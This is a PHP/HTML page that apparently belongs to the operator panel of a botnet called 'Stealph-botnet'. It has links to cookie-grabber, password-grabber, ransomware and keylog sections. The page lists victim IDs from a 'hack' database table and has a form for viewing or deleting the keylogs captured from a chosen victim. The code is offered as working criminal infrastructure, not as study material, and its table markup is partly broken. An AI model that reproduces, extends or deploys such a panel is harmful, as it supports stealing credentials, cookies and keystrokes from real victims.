<?php
    include_once 'sql.php';
?>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>FUCK  - WORlD</title>
  <link rel="stylesheet" href="css/term.css">
</head>

<body class="">

  <div class="container on">
    <div class="screen">
      <h3 class="title">
        Stealph-botnet
      </h3>
            <a href="/index.php">Home</a>
                            <a href="/coolist.php">Cookie grabber</a>
                    <a href="/pswdlist.php">password grabber</a>
                <a href="/hol.php">Ransomware</a>
           <a href="/keylist.php">keylogs</a>
      <div class="box--outer">
        <div class="box">
          <div class="box--inner">
              <div class="ScrollStyle">
            <div class="content">
              <div class="holder">
                <b>helow motherfucker;</b> 
                <br>
                <table border="1" width="100%">
                  <tr>
                    <th>victim</th>
                    <th>ip</th>
                    <th>country</th>
                  </tr>
                  <tr>
                        <?php $sql = "SELECT id FROM hack";
  $result = $conn->query($sql);
  if ($result->num_rows > 0) {
   // output data of each row
   while($row = $result->fetch_assoc()) {
    echo "<tr><td>" . $row["id"]. "</td><td>";
}
echo "</table>";
} else { echo "0 results"; }
$conn->close();
?>
                    </td>
                  </tr>
                </table>
                  <div class="row">
              <form action="/showkey.php">
                  
                  <input type="text" name="id" value="Enter username">
                  
                                    <select name="command">
                        <option value="show">see grabbed keylogs</option>
                        <option value="del">Clear all grabbed keylogs</option>


                      </select>

                                            <input type="submit" name="send" value="submit">
                    </form>
                  <div class="row">
                  </div>
                  </div>
              </div>
            </div>
          </div>
        </div>

    </div>
  </div>

</body>

</html>
